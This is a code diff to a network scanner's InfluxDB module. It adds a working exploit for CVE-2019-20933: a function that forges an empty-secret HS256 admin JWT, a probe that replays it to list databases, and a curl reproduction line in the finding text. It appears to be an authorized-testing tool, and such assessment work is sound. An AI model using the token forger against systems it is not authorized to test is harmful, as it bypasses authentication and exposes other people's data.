@@ -20,11 +20,16 @@ drops a series. Authorized testing only.
 """
 from __future__ import annotations
 
+import base64
+import hashlib
+import hmac
 import http.client
 import json
 import ssl
+import time
 import urllib.parse
 
+from ...core import proxy
 from ...core.models import Host, Port
 from ..svccommon import finding_builder, make_proof_html_wrapper, make_findings_to_vulns_wrapper
 
@@ -96,7 +101,14 @@ def _parse_databases(payload) -> list[str]:
 
 def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict:
     """Fingerprint via /ping + test the unauthenticated query API. Returns
-    {reachable, is_influxdb, version, unauth, dbs, secured, error}."""
+    {reachable, is_influxdb, version, unauth, dbs, secured, error, ...}.
+
+    When the /ping banner reports a version affected by CVE-2019-20933 (<1.7.6)
+    _and_ the query API is not obviously wide-open, this immediately follows
+    with a T2 SAFE proof (`_probe_jwt_bypass`): forge an HS256 JWT signed with
+    an empty shared secret and replay one read to /query. A 200 with a results
+    payload proves the auth is actually bypassable, not just theoretically so.
+    """
     res: dict = {"reachable": False, "is_influxdb": False, "version": "",
                  "unauth": False, "dbs": [], "secured": False, "error": ""}
     tls = port in _TLS_PORTS
@@ -125,9 +137,94 @@ def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict:
         elif st in (401, 403):
             res["secured"] = True
             res["is_influxdb"] = True
+    # T2 SAFE proof for CVE-2019-20933: only when the version tells us the
+    # bypass ought to work (<1.7.6). Skip when unauth already proved a
+    # blanket read - the finding is already covered by the stronger primitive.
+    if ver and _jwt_bypass(ver) and not res["unauth"]:
+        _probe_jwt_bypass(ip, port, tls, timeout, res)
     if not res["is_influxdb"]:
         res["error"] = res["error"] or "not an InfluxDB endpoint"
     return res
+
+
+def _forge_admin_jwt(secret: bytes = b"", ttl_seconds: int = 3600) -> str:
+    """Forge an HS256 JWT for `admin` signed with `secret` (empty by default -
+    the CVE-2019-20933 payload). Uses only hmac + base64url; no external JWT
+    library. Returns the compact 'header.payload.signature' string."""
+    def _b64u(raw: bytes) -> bytes:
+        return base64.urlsafe_b64encode(raw).rstrip(b"=")
+
+    header = _b64u(json.dumps(
+        {"alg": "HS256", "typ": "JWT"}, separators=(",", ":"),
+        sort_keys=True).encode())
+    payload = _b64u(json.dumps(
+        {"username": "admin", "exp": int(time.time()) + ttl_seconds},
+        separators=(",", ":"), sort_keys=True).encode())
+    signing_input = header + b"." + payload
+    sig = _b64u(hmac.new(secret, signing_input, hashlib.sha256).digest())
+    return (signing_input + b"." + sig).decode("ascii")
+
+
+def _probe_jwt_bypass(ip: str, port: int, tls: bool, timeout: float,
+                      out: dict) -> None:
+    """T2 SAFE proof for CVE-2019-20933. Forge an empty-secret HS256 admin JWT
+    and replay one read - GET /query?q=SHOW DATABASES with `Authorization:
+    Bearer <jwt>`. A 200 with a `results` payload confirms the bypass is live
+    (the InfluxDB build silently accepts any signature when the shared secret
+    is empty). Read-only, non-destructive, single-shot.
+
+    Populates out[jwt_bypass_confirmed|jwt_bypass_status|jwt_bypass_dbs]. Silent
+    on failure so the version-only T0 finding still emits.
+
+    Timeout is bounded (2-6s) and scaled through the operator's proxy so the
+    extra RTT stays within the module's per-target budget."""
+    scaled = proxy.scaled(min(max(timeout, 2.0), 6.0))
+    try:
+        token = _forge_admin_jwt(secret=b"")
+    except (OSError, ValueError):
+        return
+    q = "/query?" + urllib.parse.urlencode({"q": "SHOW DATABASES"})
+    resp = _request_auth(ip, port, q, tls, scaled,
+                         headers={"Authorization": "Bearer " + token})
+    if resp is None:
+        return
+    st, _h, body = resp
+    out["jwt_bypass_status"] = st
+    if st == 200 and isinstance(body, dict) and "results" in body:
+        out["jwt_bypass_confirmed"] = True
+        out["jwt_bypass_dbs"] = _parse_databases(body)[:_DB_SAMPLE]
+
+
+def _request_auth(ip: str, port: int, path: str, tls: bool, timeout: float,
+                  headers: dict):
+    """Additive variant of `_request` that sends extra headers (e.g. an
+    Authorization bearer). The T1 `_request` path is unchanged - this helper is
+    used only by the T2 JWT-bypass proof."""
+    conn = None
+    hdrs = {"User-Agent": "recce-influx/1.0"}
+    hdrs.update(headers or {})
+    try:
+        if tls:
+            conn = http.client.HTTPSConnection(
+                ip, port, timeout=timeout, context=ssl._create_unverified_context())
+        else:
+            conn = http.client.HTTPConnection(ip, port, timeout=timeout)
+        conn.request("GET", path, headers=hdrs)
+        resp = conn.getresponse()
+        rh = {k.lower(): v for k, v in resp.getheaders()}
+        body = resp.read(_MAX_BODY).decode("utf-8", "replace")
+        try:
+            return resp.status, rh, json.loads(body)
+        except ValueError:
+            return resp.status, rh, body
+    except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
+        return None
+    finally:
+        if conn is not None:
+            try:
+                conn.close()
+            except OSError:
+                pass
 
 
 # --- narratives + findings ------------------------------------------------------
@@ -207,11 +304,34 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "hostnames + admin usernames."),
                     depth_tier="t2"))
             if ver and _jwt_bypass(ver):
+                # T2 SAFE proof: probe() forges an empty-secret admin JWT and
+                # replays one SHOW DATABASES read. A 200 with results proves the
+                # bypass is live (not just a version-only inference); the
+                # captured dbs are the server-side evidence.
+                confirmed = bool(pr.get("jwt_bypass_confirmed"))
+                bypass_dbs = pr.get("jwt_bypass_dbs") or []
+                sev = "critical" if confirmed else "high"
+                tier = "t2" if confirmed else "t0"
+                detail = (f"InfluxDB {ver} accepts a JWT signed with an empty "
+                          "shared secret (CVE-2019-20933): an attacker forges "
+                          "an admin token and bypasses authentication "
+                          "entirely, even when auth is enabled.")
+                if confirmed:
+                    user_bp = [d for d in bypass_dbs if d != "_internal"]
+                    extra = ""
+                    if bypass_dbs:
+                        extra = f" ({len(bypass_dbs)} database(s)"
+                        if user_bp:
+                            extra += " incl. " + ", ".join(user_bp[:6])
+                        extra += ")"
+                    detail += (
+                        "\n\nT2 proof: recce forged an empty-secret HS256 admin "
+                        "JWT and GET /query?q=SHOW DATABASES returned HTTP 200 "
+                        "with a results payload" + extra + " - the bypass is "
+                        "live, not just a version-only inference.")
                 out.append(_finding(
-                    "high", "InfluxDB < 1.7.6 - JWT auth bypass (CVE-2019-20933)", tgt,
-                    f"InfluxDB {ver} accepts a JWT signed with an empty shared secret "
-                    "(CVE-2019-20933): an attacker forges an admin token and bypasses "
-                    "authentication entirely, even when auth is enabled.",
+                    sev, "InfluxDB < 1.7.6 - JWT auth bypass (CVE-2019-20933)", tgt,
+                    detail,
                     "influx",
                     f"# forge HS256 JWT {{username:admin, exp:...}} with empty secret, then\n"
                     f"curl -s -G '{base}/query' -H 'Authorization: Bearer <jwt>' "
@@ -224,7 +344,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "hmac+base64url, then: curl -H 'Authorization: Bearer "
                         "<jwt>' 'http://<ip>:<port>/query?q=SHOW+DATABASES' - a 200 "
                         "confirms the bypass."),
-                    depth_tier="t0"))
+                    depth_tier=tier))
     return out
 
 
